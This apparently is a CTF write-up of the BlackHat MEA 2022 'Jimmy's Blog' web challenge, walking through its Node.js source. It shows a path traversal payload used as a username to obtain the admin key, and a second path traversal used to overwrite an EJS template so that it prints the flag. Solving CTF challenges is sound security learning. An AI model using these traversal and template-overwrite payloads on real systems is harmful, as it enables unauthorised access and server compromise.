
---
title: "BlackHatMEA | Jimmy's Blog"
date: 2022-10-02T00:04:33+02:00
draft: true
tags: ["CTFS", "Web", "BlackHatMEA Qualifications-2022"]
author: "@1nk0x01"
# author: ["Me", "You"] # multiple authors
showToc: false
TocOpen: false
draft: false
hidemeta: false
comments: true
description: "Solving Jimmy's Blog Web Challenge."
canonicalURL: "https://canonical.url/to/page"
disableHLJS: true # to disable highlightjs
disableShare: false
disableHLJS: false
hideSummary: false
searchHidden: false
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowWordCount: true
ShowRssButtonInSectionTermList: true
UseHugoToc: true
cover:
    image: "https://miro.medium.com/max/640/1*Vcbfovigm3SEdluqzHkBog.png" # image path/url
    alt: "Jimmy's Blog" # alt text
    caption: "<text>" # display caption under cover
    relative: false # when using page bundles set this to true
    hidden: true # only hide on current single page
---

# Challenge

> Hard

>Description: The technology is always evolving, so why do we still stick with password-based authentication? That makes no sense! That’s why I designed my own password-less login system. I even open-sourced it for everyone interested, how nice of me!

 Me (@1nk0x01) and (@0_Zero_0) solved this challenge together.

we were given a website link and the challenge ("[Source Code](https://www.mediafire.com/file/1veynhabrcaux0g/jimmys_blog.zip/file)")

  

we went to the website to take a look at what it does and it is a blog for someone named Jimmy

  

with Login, Register and Article Page.

  

![enter image description here](https://i.imgur.com/IWrY5cn.png)

  

Nvm, we read those articles to know what Jimmy published in his Blog

  

its basically an authentication system without needing a password

  

just a username and the site automatically generates an encryption key for you to be able to login.

  

![enter image description here](https://i.imgur.com/h0IrG9C.png)

  

that is the main idea \ next step is to check the site but in a dynamic way try it i mean, so we basically went to register page and created an account with username hecker :/:

  

![enter image description here](https://i.imgur.com/so995lM.png)

  

as you see it generated a key with the name we typed with .key ext

  

we tried to make another account with the same username but nope it said username already taken xd

  

also we tried to read this key but wasn't useful, next step is to try the login

  

![enter image description here](https://i.imgur.com/BuQt2ZH.png)

  

it asks for the username and the access key were given while creating your account.

  

after we logged in just the same article page and Logout button lol?

  

we noticed that there is nothing interesting here, so we moved to the source code

  

we fired node to run the blog locally we started the fight :D

  

we read the basic main files [ run.sh, note.txt, nginx.conf, Dockerfile ]

  

nope nothing there, so let's review the juicy javascript code xd

  

we started with index.js it just routing the requests /login, /register..etc

  

but But there was something that caught my attention | those two functions

  

1- Show the content of the articles but you should be an admin

  

[edit.js](#)

	
	app.get("/edit", (req, res) => {
		if (!req.session.admin) return res.sendStatus(401);

			const id = parseInt(req.query.id).toString();

			const article_path = path.join("articles", id);

			try {

			const article = fs.readFileSync(article_path).toString();

			res.render("edit", { article: article, session: req.session, flag: process.env.FLAG });

			} catch {

				res.sendStatus(404);

			}
	})



		



  

first one is check if there is a session admin to be able to see the content the edit articles as you see there is flag: process.env.FLAG being render

2- Edit The Content of the articles

  


	
	
		app.post("/edit", (req, res) => {

		if (!req.session.admin) return res.sendStatus(401);

		try {

		fs.writeFileSync(path.join("articles", req.query.id), req.body.article.replace(/\r/g, ""));

		res.redirect("/");

		} catch {

		res.sendStatus(404);

		}

	})		
		


  

it's an endpoint only admins can access it to edit the articles **without filtering the content so that means we can found path traversal vulnerability via** `parameter id`, so how can we be admins?... fine let's continue reading the code

  

so next file was this **edit.ejs** of course to see how this file prints the flag | nothing was interested but one thing was

  [edit.js](#)
	
	<!doctype html>

	<html>

	<%- include('head.ejs') %>

	<body  class="text-dark bg-light">

		<%- include('navbar.ejs') %>

		<div  class="container my-5 px-5">

		<h3  class="text-center">Welcome jimmy_jammy, your flag is</h3>

		<p  class="mb-5 text-center"><%= flag %></p>

		<h3>Meanwhile, please feel free to edit your article</h3>

		<form  method="POST">

			<textarea  class="form-control mb-3"  rows="15"  name="article"><%= article %></textarea>

			<button  type="submit"  class="btn btn-dark w-100">Save Changes</button>

		</form>

		</div>

		<%- include('scripts.ejs') %>

		</body>
	</html>
	

  

1. html tag  with `<h3>` Welcome jimmy_jammy`</h3>`

2. we realized that this the admin name because the blog named jimmy's blog so this 90% the admin username next step is to find a way to login in as jimmy_jammy.

  
  
  

so we started see the main authentication files (register.ejs, login.ejs)

and the common file in all files was (**utils.js**) so we started with it

[utils.js](#)
![enter image description here](https://i.imgur.com/sfWOF2I.png)

  

is contains the main functions of Database inserting users, login check


1. there is username registered jimmy_jammy and admin value is 1

2. if you noticed that in register function admin = 0 for normal users

3. line 21 it looks like the script is not filtering the value so why we don't give a try for path traversal vulnerability. :::

  

so why we don't give it a try to register but using the vulnerability on our side

  

let's get into the first exploit:

  

- First step creating a user with this username to get the key of the admin ( jimmy_jammy ) => username: **`../keys/jimmy_jammy`**

  

![enter image description here](https://i.imgur.com/lmdoQOK.png)

Great, we got the admin's encryption key now we can login as the admin |\^:^/

![enter image description here](https://cdn.discordapp.com/attachments/973549672608186398/1025866986938433536/unknown.png)

  

![enter image description here](https://cdn.discordapp.com/attachments/973549672608186398/1025867501353062470/unknown.png)

  

Cool!, since we became admins, so we can view edit page and get our flag!,

![enter image description here](https://cdn.discordapp.com/attachments/973549672608186398/1025868230448910386/unknown.png)

  

Huh? is that my flag really? nvm we checked all files but we returned back to see if we missed something and yeah we missed the ngnix.conf file

[ngnix.conf](#)
  


	
		server {

		listen 80 default_server;

		listen [::]:80 default_server;

		  

		server_name _;

		  

		location / {

		# Replace the flag so nobody steals it!

		sub_filter 'placeholder_for_flag' 'oof, that was close, glad i was here to save the day';

		sub_filter_once off;

		proxy_pass http://localhost:3000;

		}

	}
	

  

Oops, Flag is being replaced `# Replace the flag so nobody steals it!`

`sub_filter 'placeholder_for_flag' 'oof, that was close, glad i was here to save the day';`

  

so we can't continue locally

Note: Don't forget we have a path traversal in edit page via id parameter.

  
while `writeFileSyncwhich()`allows us to re-write the file content to whatever we want so why we don't get a Nice RCE :D



via SSTI (Server Side Template Injection) we can determine the vulnerability by following this endpoint `?id=../views/article.ejs`

  

![enter image description here](https://media.discordapp.net/attachments/1025465085117866045/1025730056762445904/phishing_email.png)

actually i forgot to take a screenshot of the SSTI but trust me it is vulnerable :DD
  
  let's continue after we determined the vuln exists next move is to get RCE 



but instead of this we will force the server to print the flag in all `articles pages`  


by overriding the `article file` with the following code

	
	<!doctype  html>

		<html>

		<%- include('head.ejs') %>

		<body  class="text-dark bg-light">

		<%- include('navbar.ejs') %>

		<div  class="container my-5 px-5">

		<div  class="card mb-4">

		<div  class="card-header">

		<%= article.date %>

		</div>

		<div  class="card-body">

		<h5  class="card-title"><%= article.title %></h5>

		<p  class="card-text">

		<%= article.summary %>

		<hr  class="mb-0">

		<div  class="pre-line">

		<%= article.content %>

		</div>

		</p>

		</div>

		<div  class="card-footer text-muted">

		<% for (var i =1; i <=59;  i++ ) { %>
		<%  flag[i] %>
		<% } %>

		Pwned by b4Rabb1t$ 

		</div>

		</div>

		</div>

		<%- include('scripts.ejs') %>

		</body>

	</html>
	

so we intercepted the request while we editing any article and we used the id parameter and then we encoded our js payload as a url-encoded 
and we replaced article value to our script

and we forwarded the request and guess!

Bingo! We got the Jimmy Challenge
![enter image description here](https://i.imgur.com/gCoZWWe.png)


![enter image description here](https://miro.medium.com/max/1400/1*_nWlEGA12PRqerHc81l6IQ.png)

Thanks For REading..!